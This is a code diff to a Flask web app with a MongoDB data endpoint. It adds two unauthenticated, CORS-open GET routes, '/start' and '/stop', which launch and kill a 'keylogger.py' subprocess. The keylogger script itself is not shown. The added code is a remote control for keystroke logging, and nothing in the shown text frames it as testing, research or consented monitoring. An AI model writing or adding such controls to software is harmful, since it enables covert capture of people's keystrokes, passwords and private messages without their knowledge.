@@ -1,6 +1,9 @@
+import os
+import subprocess
 from flask import Flask, request, jsonify
 from pymongo import MongoClient
 from flask_cors import CORS
+import signal
 
 app = Flask(__name__)
 CORS(app)
@@ -54,6 +57,26 @@ def add_data():
 
     except Exception as err:
         return jsonify({"error": str(err)}), 500
+
+
+process = None
+@app.route('/start', methods=['GET'])
+def start_keylogger():
+    global process
+    if process is None:
+        process = subprocess.Popen(['python', 'keylogger.py'])
+        return jsonify({"status": "Keylogger started"}), 200
+    return jsonify({"status": "Keylogger already running"}), 400
+
+
+@app.route('/stop', methods=['GET'])
+def stop_keylogger():
+    global process
+    if process is not None:
+        os.kill(process.pid, signal.SIGTERM)
+        process = None
+        return jsonify({"status": "Keylogger stopped"}), 200
+    return jsonify({"status": "Keylogger is not running"}), 400
 
 
 if __name__ == '__main__':
